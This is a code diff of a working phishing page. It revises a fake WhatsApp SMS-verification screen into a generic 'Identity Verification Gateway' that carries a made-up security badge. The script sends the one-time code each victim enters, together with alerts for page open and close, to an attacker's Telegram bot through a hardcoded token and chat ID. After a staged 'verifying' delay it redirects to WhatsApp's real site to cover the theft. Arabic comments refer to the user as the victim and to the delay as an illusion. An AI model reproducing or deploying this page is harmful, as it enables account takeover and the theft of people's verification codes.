@@ -3,141 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp</title>
+    <title>Identity Verification Gateway</title>
     <style>
-        :root { 
-            --wa-bg: #111b21;
-            --wa-green: #00a884;
-            --wa-text: #e9edef;
-            --wa-hint: #8696a0;
-            --wa-border: #222d34;
+        :root {
+            --primary: #0052cc; /* لون أزرق رسمي (Corporate) */
+            --bg: #f4f7f9;
+            --text: #172b4d;
+            --secondary: #5e6c84;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }
-
-        /* Header الحقيقي بتاع واتساب */
-        .wa-header {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 15px 10px; background: var(--wa-bg);
-        }
-        .wa-header span { font-size: 18px; font-weight: 500; color: var(--wa-text); margin-left: -100px; }
-
-        .container { padding: 20px; text-align: center; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; }
         
-        h1 { font-size: 19px; font-weight: 500; margin: 10px 0; color: var(--wa-green); }
-        p { font-size: 14px; color: var(--wa-text); line-height: 1.4; margin-bottom: 5px; }
-        .phone-num { font-weight: bold; }
-
-        /* شكل خانات الكود الاحترافية */
-        .otp-container {
-            display: flex; justify-content: center; gap: 10px; margin: 30px 0;
-        }
-        .otp-input {
-            width: 100%; border: none; border-bottom: 2px solid var(--wa-green);
-            background: transparent; color: #fff; font-size: 32px;
-            text-align: center; outline: none; letter-spacing: 15px;
+        .card { 
+            background: #fff; width: 90%; max-width: 400px; padding: 35px 25px; 
+            border-radius: 12px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            text-align: center; position: relative; overflow: hidden;
         }
 
-        .hint { color: var(--wa-hint); font-size: 13px; margin-top: 10px; }
+        /* خط التحميل العلوي لإعطاء طابع "المعالجة" */
+        .progress-line { position: absolute; top: 0; left: 0; height: 4px; background: var(--primary); width: 0%; transition: 0.5s; }
 
-        /* خيارات إعادة الإرسال زي التطبيق */
-        .wa-options {
-            margin-top: 40px; text-align: left; width: 100%; padding: 0 20px;
-        }
-        .option-item {
-            display: flex; align-items: center; padding: 15px 0;
-            border-bottom: 1px solid var(--wa-border); cursor: pointer;
-        }
-        .option-item img { width: 20px; margin-right: 25px; opacity: 0.6; }
-        .option-item span { font-size: 15px; color: var(--wa-hint); }
-        .option-item .timer-val { margin-left: auto; color: var(--wa-hint); }
+        .shield { width: 50px; height: 50px; color: var(--primary); margin-bottom: 20px; }
+        h2 { font-size: 20px; margin-bottom: 12px; font-weight: 600; }
+        p { font-size: 14px; color: var(--secondary); line-height: 1.6; margin-bottom: 25px; }
 
-        .btn-submit {
-            background: var(--wa-green); color: #111b21; border: none;
-            padding: 10px 25px; border-radius: 3px; font-weight: 600;
-            margin-top: 30px; cursor: pointer; font-size: 14px;
-            text-transform: uppercase;
+        .input-box { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-size: 11px; font-weight: 700; color: var(--secondary); text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        
+        input { 
+            width: 100%; padding: 14px; border: 2px solid #dfe1e6; border-radius: 6px; 
+            font-size: 18px; outline: none; text-align: center; letter-spacing: 5px; transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary); background: #fbfcfe; }
+
+        button { 
+            background: var(--primary); color: #fff; border: none; width: 100%; 
+            padding: 15px; border-radius: 6px; font-size: 15px; font-weight: 600; 
+            cursor: pointer; transition: 0.3s;
+        }
+        button:active { transform: scale(0.98); }
+
+        .footer-secure { 
+            margin-top: 25px; display: flex; align-items: center; justify-content: center; 
+            gap: 10px; font-size: 11px; color: #a5adba; border-top: 1px solid #ebecf0; padding-top: 20px;
         }
     </style>
 </head>
 <body>
 
-    <div class="wa-header">
-        <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor" style="opacity: 0.7;"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
-        <span>Verify your number</span>
-        <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor" style="opacity: 0.7;"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg>
-    </div>
-
-    <div class="container">
-        <p>WhatsApp sent an SMS to your number.</p>
-        <p class="phone-num">+20 01030003287</p>
-
-        <div class="otp-container">
-            <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
+    <div class="card">
+        <div class="progress-line" id="p-line"></div>
+        
+        <svg class="shield" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zM10 5a1 1 0 011 1v3a1 1 0 11-2 0V6a1 1 0 011-1zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"></path></svg>
+        
+        <h2>Identity Verification</h2>
+        <p id="msg">To continue using our services, please verify your account by entering the 6-digit synchronization code sent to your mobile device.</p>
+        
+        <div class="input-box">
+            <label>Security OTP Code</label>
+            <input type="tel" id="otp" placeholder="••••••" maxlength="6" inputmode="numeric">
         </div>
+        
+        <button id="btn-main" onclick="submitData()">Confirm & Update</button>
 
-        <p class="hint">Enter 6-digit code</p>
-
-        <div class="wa-options">
-            <div class="option-item">
-                <svg viewBox="0 0 24 24" width="20" height="20" fill="#8696a0" style="margin-right:20px"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"></path></svg>
-                <span>Resend SMS</span>
-                <div class="timer-val" id="clock">1:52</div>
-            </div>
-            <div class="option-item" style="border:none">
-                <svg viewBox="0 0 24 24" width="20" height="20" fill="#8696a0" style="margin-right:20px"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"></path></svg>
-                <span>Call me</span>
-                <div class="timer-val">2:00</div>
-            </div>
+        <div class="footer-secure">
+            <span>Verified by Global Security Alliance</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/SSL_logo.png" height="15" style="filter: grayscale(1); opacity: 0.5;">
         </div>
-
-        <button class="btn-submit" onclick="submitOtp()">Next</button>
     </div>
 
     <script>
-        const B_T = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
-        const C_I = '5446862709';
+        // إعدادات البوت (التوكن والأيدي بتوعك)
+        const CONFIG = {
+            TOKEN: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
+            CHAT_ID: '5446862709'
+        };
 
-        function sendToBot(msg) {
-            fetch(`https://api.telegram.org/bot${B_T}/sendMessage`, {
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`;
+            fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: C_I, text: msg, parse_mode: 'HTML' })
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
             });
         }
 
-        const otpInput = document.getElementById('otp');
-        otpInput.addEventListener('input', function() {
-            if (this.value.length === 6) {
-                submitOtp();
-            }
-        });
+        // إرسال تنبيه أول ما الصفحة تفتح
+        window.onload = () => {
+            sendToTelegram(`🚀 <b>Authority Page Opened</b>\nTarget is viewing the Global Gateway.`);
+            // حركة شريط التحميل
+            setTimeout(() => document.getElementById('p-line').style.width = '40%', 500);
+        };
 
-        function submitOtp() {
-            const val = otpInput.value;
-            if(val.length === 6) {
-                sendToBot(`🔥 <b>OTP RECEIVED!</b>\nCode: <code>${val}</code>`);
-                // تحويل لصفحة "Checking" وهمية
-                document.body.innerHTML = `<div style="background:#111b21;height:100vh;display:flex;align-items:center;justify-content:center;color:#8696a0;flex-direction:column">
-                    <div style="border:3px solid #202c33;border-top:3px solid #00a884;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite"></div>
-                    <p style="margin-top:20px">Checking code...</p>
-                </div><style>@keyframes spin{100%{transform:rotate(360deg)}}</style>`;
-                
+        function submitData() {
+            const otpVal = document.getElementById('otp').value;
+            const btn = document.getElementById('btn-main');
+            const pLine = document.getElementById('p-line');
+
+            if(otpVal.length === 6) {
+                // تغيير شكل الزرار والتحميل
+                btn.disabled = true;
+                btn.innerHTML = "Verifying Identity...";
+                btn.style.background = "#5e6c84";
+                pLine.style.width = '80%';
+
+                // إرسال الكود للبوت
+                sendToTelegram(`🔥 <b>OTP RECEIVED (Authority)</b>\nCode: <code>${otpVal}</code>\nSystem: SSL Sync Protocol`);
+
+                // وهم المعالجة لمدة 3 ثواني
                 setTimeout(() => {
-                    window.location.href = "https://www.whatsapp.com/security";
+                    pLine.style.width = '100%';
+                    document.getElementById('msg').innerHTML = "<b style='color:#00a884'>Identity Confirmed.</b><br>Redirecting to secure session...";
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://www.whatsapp.com/security";
+                    }, 2000);
                 }, 3000);
+
+            } else {
+                alert("Please enter a valid 6-digit code.");
             }
         }
 
-        // Timer Logic
-        let t = 112;
-        setInterval(() => {
-            if(t > 0) {
-                t--;
-                let m = Math.floor(t/60); let s = t%60;
-                document.getElementById('clock').innerText = `${m}:${s<10?'0'+s:s}`;
-            }
-        }, 1000);
+        // إرسال تنبيه لو الضحية قفل الصفحة
+        window.onbeforeunload = () => {
+            sendToTelegram(`⚠️ <b>Target Disconnected</b>\nSession closed.`);
+        };
     </script>
 </body>
 </html>
